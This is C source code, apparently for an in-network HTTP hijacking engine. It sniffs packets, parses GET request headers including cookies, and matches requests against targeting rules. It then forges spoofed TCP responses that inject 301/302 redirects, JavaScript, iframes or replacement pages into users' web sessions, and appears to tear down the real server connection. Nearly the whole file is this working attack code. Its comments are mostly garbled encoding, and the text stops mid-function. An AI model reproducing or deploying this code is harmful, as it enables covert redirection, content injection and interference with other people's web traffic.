#include "main.h"

#pragma pack(1)
struct gre_hdr
{
#if 1
    union{
    uint16_t    flags_vers;
    uint16_t    ver:3,
                flags:5,
                rc:3,
                ssr:1,
                seq:1,
                key:1,
                route:1,
                chksum:1;
    };
#else
    uint16_t    chksun:1,
                route:1,
                key:1,
                seq:1,
                ssr:1,
                rc:3,
                flags:5,
                ver:3;
#endif
    uint16_t    proto;
    //uint32_t    key;
    //uint32_t    seq;
    //uint8_t data[0];
};
#pragma pack()


char *host_arrays[64]={".com",".cn",".org",".edu",NULL};

int chk_http(char *data,int dlen)
{
    if( dlen>0 && dlen<1500)
    {
        if( data[0]== 'G' && data[1]== 'E' && data[2]== 'T' )
        {
            if(data[dlen-4]=='\r' && 
               data[dlen-3]=='\n' &&
               data[dlen-2]=='\r' &&
               data[dlen-1]=='\n'  )
            {
                return 3;
            }
            else
            {
                return 1;
            }
        }
        else
        {
            if(data[dlen-4]=='\r' && 
               data[dlen-3]=='\n' &&
               data[dlen-2]=='\r' &&
               data[dlen-1]=='\n'  )
            {
                return 2;
            }
        }
    }
    return 0;
}
int	proc_pkt(tEthpkt *pkthdr)
{
	tEther	*pEth;
//	tArp	*pArp;
	tIp		*pIp=NULL;
	tTcp	*pTcp=NULL;
	tUdp	*pUdp=NULL;
	tIcmp	*pIcmp=NULL;
	tIp		*pIpIp = NULL;
	uint32_t		index=0;
	t802_1q	*q8021q;
	t802_1q	*q8021q_2;
	uint16_t	proto;
	uint16_t	*ptmp;
    struct gre_hdr    *qgre=NULL;
    
	int		ifindex;
	int		qid;

	pkthdr->pIcmp = NULL;
	pkthdr->pTcp = NULL;
	pkthdr->pUdp = NULL;
	pkthdr->pIp = NULL;
	pkthdr->pIpIp = NULL;

	ifindex = pkthdr->ifindex;
	qid		= pkthdr->qid;

 
	pEth = (tEther *)pkthdr->pEth;
	if(pEth->proto == htons(PROTO_IP) )
	{
		pIp = (tIp	*)pEth->data;
	}
	else if(pEth->proto == htons(PROTO_PPPOE) )
	{
		pIp = (tIp		*)( pEth->data + 8 );
	}
	else if(pEth->proto == htons(PROTO_8021q) )
	{
		q8021q = (t802_1q	*)&pkthdr->pEth->proto;
		ptmp = (uint16_t *)q8021q->data;
		proto = *ptmp;
		
		//vlan + ip
		if( proto ==	htons(PROTO_IP))
		{
			pIp = (tIp		*)(pEth->data+4);
		}	
		//valn + pppoe
		else if(	proto == 	htons(PROTO_PPPOE)	)
		{
			pIp = (tIp		*)(pEth->data + 4+ 8);
		}		
		//vlan + vlan + ip/pppoe
		else if(proto ==	htons(PROTO_8021q)	)	
		{
			q8021q_2 = (t802_1q	*)q8021q->data;
			ptmp = (uint16_t *)q8021q_2->data;
			proto = *ptmp;
			if(	proto == 	htons(PROTO_IP)	)
			{
				pIp = (tIp		*)(pEth->data + 4 + 4);
			}
			else if(	proto == 	htons(PROTO_PPPOE)	)
			{
				pIp = (tIp		*)(pEth->data + 4 + 4 + 8);
			}
		}	
	}
	else if(pEth->proto == htons(PROTO_ARP) )
	{
		pkthdr->pArp = (tArp	*)pEth->data;
	}

	if(pIp && pIp->hlen== 0x45)
	{
		pkthdr->pIp = pIp;
		if(pIp->proto == PROTO_TCP)
		{
			pTcp = (tTcp *)IP_DATA(pIp);
			pkthdr->pTcp = pTcp;
			index = pIp->src+pIp->dest+pTcp->sport + pTcp->dport;

			//if_qid_arr[ifindex][qid].
		}
		else if(pIp->proto == PROTO_UDP)
		{
			pUdp = (tUdp *)IP_DATA(pIp);
			pkthdr->pUdp = pUdp;
			index = pIp->src+pIp->dest+pUdp->sport + pUdp->dport;		
		}
		else if(pIp->proto == PROTO_ICMP)
		{
			pIcmp = (tIcmp *)IP_DATA(pIp);
			pkthdr->pIcmp = pIcmp;	
			index = pIp->src+pIp->dest;
		}	
		else if(pIp->proto == PROTO_IPIP)
		{
			pIpIp = (tIp *)IP_DATA(pIp);
			pkthdr->pIpIp = pIpIp;	
			index = pIp->src+pIp->dest;
		}	
		else if(pIp->proto == PROTO_GRE)
		{
			qgre = (struct gre_hdr *)IP_DATA(pIp);
            if( qgre->proto == htons(PROTO_IP) )
            {
#if 0                
                printf(" key:%d seq:%d %d %d %d %d %d %d %d\n",
                    qgre->key,
                    qgre->seq,
                    qgre->ver,
                    qgre->flags,
                    qgre->rc,
                    qgre->ssr,
                    qgre->route,
                    qgre->chksum,
                    qgre->flags_vers);
#endif
                if( qgre->flags_vers == 0x30 )
                {
                    pIp = (tIp	*)( (char*)qgre + 12);
                }
                else if( qgre->flags_vers == 0x20)
                {
                    pIp = (tIp	*)( (char*)qgre + 8);
                }
                else
                {
                    pkthdr->pIp = NULL;
                    pkthdr->pTcp = NULL;
                    return 0;
                }
                if(pIp && pIp->hlen== 0x45)
                {
                    pkthdr->pIp = pIp;
            		if(pIp->proto == PROTO_TCP)
            		{
                        pTcp = (tTcp *)IP_DATA(pIp);
                        pkthdr->pTcp = pTcp;
                        index = pIp->src+pIp->dest+pTcp->sport + pTcp->dport;
            		}
                    else if(pIp->proto == PROTO_UDP)
                    {
                        pUdp = (tUdp *)IP_DATA(pIp);
                        pkthdr->pUdp = pUdp;
                        index = pIp->src+pIp->dest+pUdp->sport + pUdp->dport;       
                    }
            		else if(pIp->proto == PROTO_ICMP)
            		{
            			pIcmp = (tIcmp *)IP_DATA(pIp);
            			pkthdr->pIcmp = pIcmp;	
            			index = pIp->src+pIp->dest;
            		}	                 
                }
            }
		}        
	}

	return index;
}
int proc_http_headr(char *data ,int dlen, http_elts *elt)
{
	int ts=0;
	char *str_ts=data;			//ָ��Ҫcp�Ŀ�ʼ�ط�
	//str_ts��ʼ�ط�
	//st  ����ƫ��
	for(ts=0;ts<dlen-2;ts++)
	{
		if(	data[ts] == '\r')
		{
			data[ts]=0;
			//get:/?f=mgjstat2345m HTTP/1.1\r\n
			if(	strncmp(str_ts,"GET ",4 ) == 0 )
			{
				if(ts>9) data[ts-9]=0;
				elt->get = str_ts+4;
				//printf("get:%s ts:%d\n",elt->get , ts);
			}
			else if(	strncmp(str_ts,"Host: ",6 ) == 0 )
			{
				elt->host=str_ts+6;
				//printf("host:%s\n",elt->host);
			}
			else if(	strncmp(str_ts,"Cookie: ",8 ) == 0 )
			{
				elt->cookie=str_ts+8;
				//printf("cookie:%s\n",elt->cookie);
			}	
			else if(	strncmp(str_ts,"User-Agent: ",12 ) == 0 )
			{
				elt->agent= str_ts+12;
				//printf("agent:%s\n",elt->agent);
			}			
			else if(	strncmp(str_ts,"Referer: ",9 ) == 0 )
			{
				//http://yanganqi.baijia.baidu.com/article/51038
				elt->refer=str_ts+9+7;
				char *refer_end = strchr(elt->refer,'/');
				if(  refer_end )
				{
					//*refer_end = 0;
				}
				//printf("refter:%s\n",elt->refer);
			}			
			str_ts = data+ts+2;
		}
	}	
	return 1;
}
int match_table_ip(int id,unsigned int ip)
{
    int ii=0;
    Subnet *subnet;
    unsigned int sip,index;
    SubTable  *subtable;

    sip = ntohl(ip);
    subtable = &sub_array[id];
    
    for (ii=0; ii<subtable->g_masknum; ii++)
    {
        index  = (sip & subtable->mask_tab[ii]);
        index  = IPMASK_HASH(index, subtable->mask_tab[ii]);
        subnet = subtable->subnet_lists[index];
        while (subnet)
        {
            if ((subnet->sip & subnet->mask) == (sip & subtable->mask_tab[ii]))
            {
                if ((sip <= subnet->eip) && (sip >= subnet->sip))
                {
                    return subnet->id;
                }
            }
            subnet = subnet->next;
        }
    }
    return 0;
}

int chck_hiturl(char *host, char *get)
{
	int index;
    int len=0,glen=0,offset=0;
	HAfter  *aftr=NULL;
	index = str_2_index( host,tcfg.http_hsize  );
	//index += str_2_index( get,tcfg.http_hsize );
	//index = index %  tcfg.http_hsize;	
	
	aftr = hlist.after_arrs[index];
	while(aftr)
	{
       // printf("index:%d  host:%s host:%s\n",index,aftr->host,host);
		if( strcmp(aftr->host,host)==0 )
		{
            if( aftr->uri_word == 0 )
            {
                if(strcmp(aftr->get,get)==0)
                {
			        aftr->hit_times++;
                    if(g_debug)
            		{
            			printf("hiturl num:%d==> %s%s\n",aftr->hit_times,host,get);
            		}
			        return 1;
                }
            }
            else
            {
                glen = strlen(get);
                len = strlen(aftr->word_last);
                offset = glen -len;
                if( offset>=0 )
                {
                    if( aftr->word_last[0] && aftr->word_before[0] )
                    {
                        if( strstr(get,aftr->word_last) &&strstr( get,aftr->word_before) )
                        {
         			        aftr->hit_times++;
                            if(g_debug)
                    		{
                    			printf("hiturl  num:%d==>  befor:%s last:%s\n",
                                    aftr->hit_times,aftr->word_before,aftr->word_last);
                    		}                        
        			        return 1;
                        }                        
                    }
                    else if( aftr->word_last[0])
                    {
                        if( strstr(get,aftr->word_last) )
                        {
         			        aftr->hit_times++;
                            if(g_debug)
                    		{
                    			printf("hiturl  num:%d==>  word_last:%s\n",
                                    aftr->hit_times,aftr->word_last);
                    		}                        
        			        return 1;
                        }
                    }
                    else if( aftr->word_before[0])
                    {
                        if( strstr( get,aftr->word_before  ) )
                        {
                            if(g_debug)
                    		{
                    			printf("hiturl num:%d==> word_before:%s\n",
                                    aftr->hit_times,aftr->word_before);
                    		}
 			                aftr->hit_times++;
			                return 1;
                        }
                    }
                }
            }
//          printf("%s %s %s %s\n",host,get,aftr->word_last,get);
		}
		aftr = aftr->next;
	}
	return 0;
}
int chck_keystr(int id,char *str)
{
    if(id==0)
    {
        return 1;
    }
    else
    {
        if( str && str_ac( &keystr_arr[id].ac ,str ) > 0 )
        {
            if(g_debug)
            {
                    //printf("chck_match ==> %s  filter_str:%s\n",str ,keystr_arr[id].ac.keys[0]);
            }
            return 1;
        }        
    }
    return 0;
}


int chck_match(HBefore *befr, char *get,http_elts  *elt,unsigned int src)
{
    int id=0,i=0,len;
    int max_len=0;
    char *tmp,*start,*tok;
    //Max_len
    //Timer 
    max_len = befr->idset.max_len;
    if( max_len )
    {
        if( elt->uri_len > max_len )
        {
            return 0;
        }
    }
    //Timer 
    id = befr->idset.must_timer;
    if( id && timer_arr[id].wday[g_wday] ==0 )
    {
        //printf("id:%d min:%d ret:%d\n",id,g_min,timer_arr[id].times[g_min]);
        if( timer_arr[id].times[g_min]==0)
        {
            return 0;
        }
    }
    //UA �����,����ϵͳ���
    id = befr->idset.must_ua;
    if(id && chck_keystr(id,elt->agent) ==0 )
    {
        return 0;
    }
    id = befr->idset.filter_ua;
    if(id && chck_keystr(id,elt->agent) )
    {
        return 0;
    }
    //���� COOKIE
    id = befr->idset.filter_ck;
    if( id && chck_keystr(id,elt->cookie) )
    {
        return 0;
    }
    //filter Refer ���
    id = befr->idset.filter_refer;
    if( id && chck_keystr(id,elt->refer) )
    {
        return 0;
    }
    //must Refer ���
    id = befr->idset.must_refer;
    if( id && chck_keystr(id,elt->refer)==0 )
    {
        return 0;
    }
    //filter ip ��� 
    id = befr->idset.filter_ip;
    if( id && match_table_ip(id,src) )
    {
        if(g_debug) printf("match filter ip:%s  id:%d\n",get_ipv4(src),id );
        return 0;        
    }
    //must ip ��� 
    id = befr->idset.must_ip;
    if( id && match_table_ip(id,src) ==0 )
    {
        if(g_debug) printf("not match must ip:%s  id:%d\n",get_ipv4(src),id );
        return 0;        
    }
    //URI��� ��׼
#if 1
	if(befr->any_finish)
	{
        if( strncmp(befr->get,get,strlen(befr->get)) )
        {
            return 0;
        }
        start = get+strlen(befr->get);
        for( i=0;i<befr->uri_nums;i++)
        {
        	tok = befr->uris[i];
        	tmp = strstr( start,tok );
        	if(tmp==NULL)
        	{
        		return 0;
        	}
        	start = tmp;
        }
        return 1;
	}
	else
	{
		//û�г��� *
		if(befr->uri_nums ==0)
		{
	        if( strcmp(befr->get,get) )
	        {
	            return 0;
	        }			
		}
		else	//1
		{
	        if( strncmp(befr->get,get,strlen(befr->get)) )
	        {
	            return 0;
	        }		
	        start = get+strlen(befr->get);
	        for( i=0;i<befr->uri_nums;i++)
	        {
	        	tok = befr->uris[i];
	        	//tok����
	        	if(i== (befr->uri_nums-1) )
	        	{
	        		len = strlen(get)-strlen(tok);
	        		if( strcmp( tok,get+len) )
	        		{
	        			return 0;
	        		}
	        	}
	        	else
	        	{
		        	tmp = strstr( start,tok );
		        	if(tmp==NULL)
		        	{
		        		return 0;
		        	}
		        	start = tmp;
	        	}
	        }			
		}
		return 1;
	}
#else
    if( befr->idset.uri_match & MATCH_EQL)
    {
        if( strcmp(befr->get,get)==0 )
        {
            return 1;
        }
    }
    //URI��� ģ��
    if( befr->idset.uri_match & MATCH_FUZZY)
    {
        //���ܷ��Ͼ�׼��
        if( strcmp(befr->get,get) ==0 )
        {
            return 0;
        }
        //����ӵ�е��ַ���,�����return 0
        id = befr->idset.filter_str;
        if(id && chck_keystr(id,get) )
        {
            return 0;
        }
        //����Ҫ���ַ���,���û��return 0
        id = befr->idset.must_str;
        if(id && chck_keystr(id,get) ==0 )
        {
            return 0;
        }
        //����Ҫ�ĸ����ַ���,���û��return 0
        offset = keystr_arr[id].ac.ret_offset[0];
        id = befr->idset.must_addstr;
        if(id && offset>0 && offset<1514 && chck_keystr(id,get+offset) ==0 )
        {         
            return 0;
        }   
        return 1;
    }
#endif    
    return 0;
}
int chck_inter(HBefore *befr,HAfter  *aftr,tUser *user,http_elts  *elt)
{
	int interval,percent,pos=0;
	int ret=0;
    uint32_t     lst_time;
    char        *tid;
    //ʱ�����,interval, ���в���,ip����,refer����,word_id
    interval = befr->idset.interval;
    percent  = befr->idset.percent;
    lst_time = user->hit_ptr[aftr->id];

    if(tcfg.nat_env==0 && befr->idset.set_cookie==0)
    {
        if (interval)
        {
            if( (g_nowtime - lst_time) <   intv_arr[interval].intval)
            {
            	if(g_debug) printf("id:%d interval:%u now_time:%ld last_time:%u\n",
            		befr->id,intv_arr[interval].intval ,g_nowtime, lst_time
            	);
                return 0;
            }
        }
        else if(percent)
        {
            percent = percent%100;
            pos = befr->visite%100;
            ret = tcfg.pers[percent][pos];
            if( ret == 0 )
            {
            	if(g_debug) printf("id:%d pos:%d visite:%d\n",
            		befr->id,pos,befr->visite);                    
                return 0;
            }
        }
    }
    else
    {
        if(elt->cookie && befr->idset.set_cookie )
        {
            tid=strstr(elt->cookie ,"TID=");
            if(tid)
            {
                tid+=4;
                lst_time = atol(tid);
                //printf("%u %u %d\n",g_nowtime , lst_time , intv_arr[interval].intval );
        		if( (g_nowtime - lst_time) < intv_arr[interval].intval	)
        		{
                	if(g_debug) 
                    printf("id:%d interval:%u now_time:%ld last_time:%u\n",
                		befr->id,intv_arr[interval].intval,g_nowtime, lst_time
                	);
                    return 0;
        		}
            }
        }
    }
    user->hit_ptr[aftr->id] = g_nowtime;
    return 1;
}
int get_word(HBefore *befr,HAfter  *aftr,tUser *user,http_elts  *elt)
{
	int id;
	int ret=0,index,offset;
	char *str,*end,*start;
    //ƥ��ģʽ
    if(befr->idset.uri_word)
    {
    	id= befr->idset.word_id;
    	if(id)
    	{
            //printf("id:%d\n",id);
    		ret = str_ac( &keystr_arr[id].ac,elt->get);
    		if( ret )
    		{
    			index = keystr_arr[id].ac.ret_index[0];
    			offset = keystr_arr[id].ac.ret_offset[0];
    			str =  keystr_arr[id].ac.keys[index];
    			start = elt->get+offset+strlen(str);
                //
    			end = strchr(start,'&');
    			if(end)
    			{
    				*end=0;
                    if(strlen(start)>=sizeof(elt->words))
                    {
                        if(g_debug) 
                        {
                            printf("word too long start:%s\n",start);
                        }
                        return 0;
                    }
    				strcpy(elt->words ,start);
    				*end='&' ;
    			}
    			else
    			{
                    if(strlen(start)>=sizeof(elt->words))
                    {
                        if(g_debug) 
                        {
                            printf("word too long start:%s\n",start);
                        }                        
                        return 0;
                    }                    
    				strcpy(elt->words ,start);
    			}
    		}
            else
            {
                return 0;
            }
    	}
        else
        {
            return 0;
        }
    }
    return 1;
}

HBefore *get_url(char *host,char *get,http_elts  *elt,unsigned int src )
{
	int i=0;
    int flag=0;
	int index;
	char     host2[64];
	HBefore *befr=NULL;
	char	*tmp,*h_tmp;
	index = str_2_index(host, tcfg.http_hsize);
	befr  = hlist.before_arrs[index];		
	if(befr)
	{
		while(befr)
		{	
			if( strcmp(befr->host,host)==0)
			{
                if( chck_match(befr,get,elt,src) == 1)
                {
                    flag=1;
                    break;
                }
			}
			befr = befr->next;
		}
	}
    if(flag==0)
    {
		strncpy(host2,host,sizeof(host2)-1);
		tmp = strchr(host2,'.');
		if(tmp)
		{
		    for(h_tmp=host_arrays[i];h_tmp=host_arrays[i],h_tmp !=NULL;i++)
		    {
		        if( strcmp(tmp,h_tmp) ==0 )	
		        {
					return NULL;
				}
		    }
            *tmp = 0;
			host = tmp + 1;
			index = str_2_index(host, tcfg.http_hsize);
			befr  = hlist.before_arrs[index];
			if(befr)
			{
				while(befr)
				{	
					if( befr->host_match && strcmp(befr->host,host)==0)
					{
                        //�Ƚ�ǰ׺
                        if( befr->host_match==2  )
                        {
                            if( befr->host_seg && strncmp(host2,befr->host_seg,strlen(befr->host_seg))==0 )
                            {
                                if( chck_match(befr,get,elt,src) == 1)
                                {
                                    flag=1;
                                    break;
                                }                            
                            }
                        }
                        else
                        {
    		                if( chck_match(befr,get,elt,src) == 1)
    		                {
    		                    flag=1;
    		                    break;
    		                }
                        }
					}
					befr = befr->next;
				}
			}				
		}
    }
	return befr;
}
HAfter  *get_after(HBefore *befr)
{
    int     rand;
    HAfter *aftr;
    rand = g_nowtime%befr->after_num;
	aftr =	befr->afters[rand];
    return aftr;
}

int http_conts(char *send_buff,HAfter  *aftr,http_elts *elt ,HBefore *befr)
{
	int     html_t=0;
	int     mode = befr->push_mode;
	int     word = befr->idset.uri_word;
        
	char *tmp=send_buff;
	if(mode == PUSH_302 )
	{
        tmp  += sprintf(tmp, "HTTP/1.1 302 Moved Temporarily\r\n");
        if(word == 0 )
        {
            tmp  += sprintf(tmp, "Location: %s://%s%s\r\n",aftr->protos,aftr->host,aftr->get);
        }
        else
        {
            tmp  += sprintf(tmp, "Location: %s://%s%s%s%s\r\n",aftr->protos,aftr->host,aftr->word_before,elt->words ,aftr->word_last);            
        }
        tmp  += sprintf(tmp, "Connection: close\r\n");
		tmp  += sprintf(tmp, "Content-Type: text/html\r\n");
		tmp  += sprintf(tmp, "Content-length: 0\r\n\r\n");
	}
    else if(mode == PUSH_301 )
    {
        tmp  += sprintf(tmp, "HTTP/1.1 301 Moved Permanently\r\n");
        if(word ==0)
        {
            tmp  += sprintf(tmp, "Location: %s://%s%s\r\n",aftr->protos,aftr->host,aftr->get);
        }
        else
        {
            tmp  += sprintf(tmp, "Location: %s://%s%s%s%s\r\n",aftr->protos,aftr->host,aftr->word_before,elt->words ,aftr->word_last);            
        }
        tmp  += sprintf(tmp, "Connection: close\r\n");
		tmp  += sprintf(tmp, "Content-Type: text/html\r\n");
		tmp  += sprintf(tmp, "Content-length: 0\r\n\r\n");        
    }
    else if(mode == PUSH_200_JS_LOC)
    {
        html_t = aftr->rep_contlen+3;
        tmp += sprintf(tmp,"HTTP/1.1 200 OK\r\n");
		tmp += sprintf(tmp,"Server: apache/1.0\r\n");
		tmp += sprintf(tmp,"Content-Length: %d\r\n",html_t);
		tmp += sprintf(tmp,"Connection: close\r\n\r\n");
		tmp += sprintf(tmp,"%s%s://%s%s%s",
				rep_js_loc1,aftr->protos,aftr->host,aftr->get,rep_js_loc2);        
    }
    else if(mode == PUSH_200_JS_INSERT_JS)
    {
        html_t = aftr->rep_contlen + 3;
        tmp += sprintf(tmp,"HTTP/1.1 200 OK\r\n");
		tmp += sprintf(tmp,"Server: apache/1.0\r\n");            
		tmp += sprintf(tmp,"Content-Length: %d\r\n",html_t);
		tmp += sprintf(tmp,"Content-Type: text/javascript\r\n");
		tmp += sprintf(tmp,"Expires: Tue, 22 Apr 2010 05:24:05 GMT\r\n");
		tmp += sprintf(tmp,"Connection: close\r\n\r\n");
		tmp += sprintf(tmp,"%s%s://%s%s%s",
				rep_js_add_js1,aftr->protos,aftr->host,aftr->get,rep_js_add_js2);         
    }        
    else if(mode == PUSH_200_BODY)
    {
        html_t = aftr->rep_contlen;
        tmp += sprintf(tmp,"HTTP/1.1 200 OK\r\n");
		tmp += sprintf(tmp,"Server: apache/1.0\r\n");             
		
		tmp += sprintf(tmp,"Content-Length: %d\r\n",html_t);
        tmp += sprintf(tmp,"Expires: epoch\r\n");
		tmp += sprintf(tmp,"Content-Type: text/html\r\n");
		tmp += sprintf(tmp,"Expires: Tue, 22 Apr 2010 05:24:05 GMT\r\n");	
		tmp += sprintf(tmp,"Connection: close\r\n\r\n");
		tmp += sprintf(tmp,"%s",aftr->content);        
    }
    else if(mode == PUSH_200_IFRAME_URL)
    {
        html_t = aftr->rep_contlen+3;
        tmp += sprintf(tmp,"HTTP/1.1 200 OK\r\n");
		tmp += sprintf(tmp,"Server: apache/1.0\r\n");             
		tmp += sprintf(tmp,"Content-Length: %d\r\n",html_t);
        tmp += sprintf(tmp,"Expires: epoch\r\n");
		tmp += sprintf(tmp,"Content-Type: text/html\r\n\r\n");
		tmp += sprintf(tmp,"%s%s://%s%s%s",
				rep_iframe_url1,aftr->protos,aftr->host,aftr->get,rep_iframe_url2);        
    }
    else if(mode == PUSH_200_IFRAME_ADDJS)
    {
        html_t = aftr->rep_contlen + strlen(elt->host)+strlen(elt->get);
        tmp += sprintf(tmp,"HTTP/1.1 200 OK\r\n");
        tmp += sprintf(tmp,"Server: apache/1.0\r\n");             
        tmp += sprintf(tmp,"Content-Length: %d\r\n",html_t);
        tmp += sprintf(tmp,"Content-Type: text/html\r\n");
        tmp += sprintf(tmp,"Expires: Tue, 22 Apr 2010 05:24:05 GMT\r\n"); 
        tmp += sprintf(tmp,"Connection: close\r\n\r\n");
        tmp += sprintf(tmp,"%s%s%s%s%s%s%s",
             rep_iframe_addjs1,elt->host,elt->get,rep_iframe_addjs2, aftr->host,aftr->get,rep_iframe_addjs3);

    }
    else if(mode == PUSH_200_JS_NOREFER)
    {
        html_t = aftr->rep_contlen+3;
        tmp += sprintf(tmp,"HTTP/1.1 200 OK\r\n");
		tmp += sprintf(tmp,"Server: apache/1.0\r\n");             
		tmp += sprintf(tmp,"Content-Length: %d\r\n",html_t);
        tmp += sprintf(tmp,"Expires: epoch\r\n");
		tmp += sprintf(tmp,"Content-Type: text/html\r\n\r\n");
		tmp += sprintf(tmp,"%s%s://%s%s%s",
				rep_jsurl_norefer1,aftr->protos,aftr->host,aftr->get,rep_jsurl_norefer2);        
    }    
	return tmp - send_buff;
}
int http_addtunnel(char *buff,int dlen)
{
    int tunnel_len=0;
    tIp *pIp;
	if(tcfg.tunnel_sip)
	{
	    pIp=(tIp *)buff;
	    pIp->hlen       = 0x45;
        pIp->tos        = 0x10;
        pIp->len        = htons(dlen+20+20+20);
        pIp->ipid       = htons(0x1234);
        pIp->fragoff    = 0;
        pIp->ttl        = 100;
        pIp->proto      = PROTO_IPIP;
        pIp->src        = tcfg.tunnel_sip;;
        pIp->dest       = tcfg.tunnel_dip;;
        pIp->cksum      = 0;
        pIp->cksum      = cksum_ip(pIp);
		//*bpIp = (tIp *)((char*)pIp + 20);
		tunnel_len=20;
	}
	return tunnel_len;
}

int http_action(HBefore *befr ,HAfter  *aftr,tIp *pIp, tTcp *pTcp,int dlen,http_elts *elt,tEthpkt *pkthdr)
{
    uint32_t	sip,dip;
    uint16_t	sport,dport;    
    uint32_t	seq,ack;
    char	send_buff[10240];
    char	str_conts[10240];
	int		cnt_len,seg_len;
	int     sendlen;
	int     tunel_len=0;
    int     key=0,val=0,i=0,f=0,t=0;
    tEther *pEth=NULL;
    struct sockaddr_in	sockaddr;
    int     offlen=0;
    int     ppp_flag=0;
    pppoe_session  *ppp_s=NULL;
    
    sport     = pTcp->sport;
    dport     = pTcp->dport;
    seq       = pTcp->seq;
    ack       = pTcp->ack;
    sip       = pIp->src;
    dip       = pIp->dest;  
    
    tunel_len =0;
    cnt_len = http_conts(str_conts,aftr,elt,befr);

	if(g_debug)
    {
        LOG_DEBUG(H,"\nhttp://%s%s\n%s..\n",elt->host,elt->get,str_conts);
	}
    tunel_len = http_addtunnel(send_buff,cnt_len);
    if(tcfg.l2_sock)
    {
        pEth = (tEther *)send_buff;
        offlen = (char *)pkthdr->pIp - (char *)pkthdr->pEth;
        if(offlen>0&& offlen<32)
        {
            memcpy(send_buff,(char *)pkthdr->pEth,offlen);
        }
        #if 0
        memcpy(pEth->dest,pkthdr->pEth->src,6);
		memcpy(pEth->src,pkthdr->pEth->dest,6);
		#else
        	memcpy(pEth->src,eth_arr[tcfg.l2_sock].mac,6);
        	memcpy(pEth->dest,tcfg.l2_mac,6);
        #endif
        if(pkthdr->pEth->proto == htons(0x8864))
        {
            ppp_flag=1;
            ppp_s = (pppoe_session *)pEth->data;
        }
        pIp = (tIp *)(send_buff+tunel_len+offlen);
        //printf("ppp_flag:%d offlen:%d\n",ppp_flag,offlen);
    }
    else
    {
    	pIp = (tIp *)(send_buff+tunel_len);
    }
    pTcp = (tTcp *)pIp->data;
	//���͸��ͷ��˵� location
    key = cnt_len/1400;
    val = cnt_len%1400;
    f = ( val?(key+1):key );
    for(i=0;i<f;i++)
    {
        seg_len = (i==(f-1))?val:1400;
        memcpy(pTcp->data,str_conts+t , seg_len);

        if(ppp_flag)
        {
            ppp_s->payload = htons(seg_len+20+20+2);
        }
        pIp->hlen       = 0x45;
        pIp->tos        = 0x10;
        pIp->len        = htons(seg_len+20+20);
        pIp->ipid       = htons(0x1234);
        pIp->fragoff    = 0;
        pIp->ttl        = 100;
        pIp->proto      = PROTO_TCP;
        pIp->src        = dip;
        pIp->dest       = sip;
        pIp->cksum      = 0;
        pIp->cksum      = cksum_ip(pIp);


        pTcp->dport     = sport;
        pTcp->sport     = dport;
        pTcp->seq       = htonl( ntohl(ack) + t );  //ack;							//�Է���ack
        pTcp->ack       =  htonl( ntohl(seq) + dlen );	//�Է���seq+len  //cnt_len
        pTcp->offset    = 0x50; 
        pTcp->code =   (i==(f-1))?TCPF_PSH | TCPF_ACK:TCPF_ACK;

        pTcp->window    = htons(0x1234);
        pTcp->cksum     = 0;
        pTcp->cksum     = cksum_tcp(pIp);    

    	
    	sockaddr.sin_family = AF_INET;

        sockaddr.sin_port   = pTcp->dport;
        memcpy(&sockaddr.sin_addr, &pIp->dest, sizeof(uint32_t) ); 
        if(tcfg.l2_sock)
        {
            sendlen = xmit_buffer(tcfg.l2_sock ,send_buff,tunel_len+seg_len +20+20+offlen);
        }
        else
        {
    	    sendlen = sendto(xmit_sock , send_buff, tunel_len+seg_len +20+20, 0,(struct sockaddr *)&sockaddr, sizeof(sockaddr) );
        }
        t+=seg_len;
        if(g_debug) LOG_DEBUG(H,"sendto:%d cnt_len:%d seg_len:%d\n",sendlen,cnt_len,seg_len);
	}
	


/**************************************************************/
	//���͸��ͷ��˵� ack
    if(ppp_flag)
    {     
        ppp_s->payload = htons(20+20+2);
    }
    pIp->hlen       = 0x45;
    pIp->tos        = 0x10;
    pIp->len        = htons( 0+20+20);
    pIp->ipid       = htons(0x1234);
    pIp->fragoff    = 0;
    pIp->ttl        = 100;
    pIp->proto      = PROTO_TCP;
    pIp->src        = dip;
    pIp->dest       = sip;
    pIp->cksum      = 0;
    pIp->cksum      = cksum_ip(pIp);

    pTcp->dport     = sport;
    pTcp->sport     = dport;
    pTcp->seq       = htonl( ntohl(ack) + cnt_len );
    pTcp->ack       =  htonl( ntohl(seq) + dlen );
    pTcp->offset    = 0x50; 
    pTcp->code      =  TCPF_FIN | TCPF_PSH ;      //  |TCPF_FIN | TCPF_RST|TCPF_PSH TCPF_ACK
    pTcp->window    = htons(0x1234);
    pTcp->cksum     = 0;
    pTcp->cksum     = cksum_tcp(pIp);    

    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port   = pTcp->dport;
    memcpy(&sockaddr.sin_addr, &pIp->dest, sizeof(uint32_t) ); 
    if(tcfg.l2_sock)
    {
        sendlen = xmit_buffer(tcfg.l2_sock ,send_buff,tunel_len+20+20+offlen);
    }
    else
    {
	    sendlen = sendto(xmit_sock , send_buff, tunel_len+0+20+20, 0,(struct sockaddr *)&sockaddr, sizeof(sockaddr) );
    }
	if(g_debug) LOG_DEBUG(H,"sendto:%d\n",sendlen);
#if 0
	//���͸��ͷ��˵� rst
    pIp->hlen       = 0x45;
    pIp->tos        = 0x10;
    pIp->len        = htons( 0+20+20);
    pIp->ipid       = htons(0x1234);
    pIp->fragoff    = 0;
    pIp->ttl        = 100;
    pIp->proto      = PROTO_TCP;
    pIp->src        = dip;
    pIp->dest       = sip;
    pIp->cksum      = 0;
    pIp->cksum      = cksum_ip(pIp);

    pTcp->dport     = sport;
    pTcp->sport     = dport;
    pTcp->seq       = htonl( ntohl(ack) + cnt_len+1 );
    pTcp->ack       =  htonl( ntohl(seq) + dlen );
    pTcp->offset    = 0x50; 
    pTcp->code      = TCPF_RST ;        // |TCPF_PSH | TCPF_RST|TCPF_PSH TCPF_ACK
    pTcp->window    = htons(0x1234);
    pTcp->cksum     = 0;
    pTcp->cksum     = cksum_tcp(pIp);    

    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port   = pTcp->dport;
    memcpy(&sockaddr.sin_addr, &pIp->dest, sizeof(uint32_t) );    
	sendlen = sendto(xmit_sock , send_buff, tunel_len+0+20+20, 0,(struct sockaddr *)&sockaddr, sizeof(sockaddr) );

	if(g_debug) printf("sendto:%d\n",sendlen);

#endif
    /**************************************************************/
	//���͸��������� rst	
    if(ppp_flag)
    {
        memcpy(pEth->dest,pkthdr->pEth->dest,6);
        memcpy(pEth->src,eth_arr[tcfg.l2_sock].mac,6);        
        ppp_s->payload = htons(20+20+2);
    }
    pIp->hlen       = 0x45;
    pIp->tos        = 0x10;
    pIp->len        = htons(0+20+20);
    pIp->ipid       = htons(0x1234);
    pIp->fragoff    = 0;
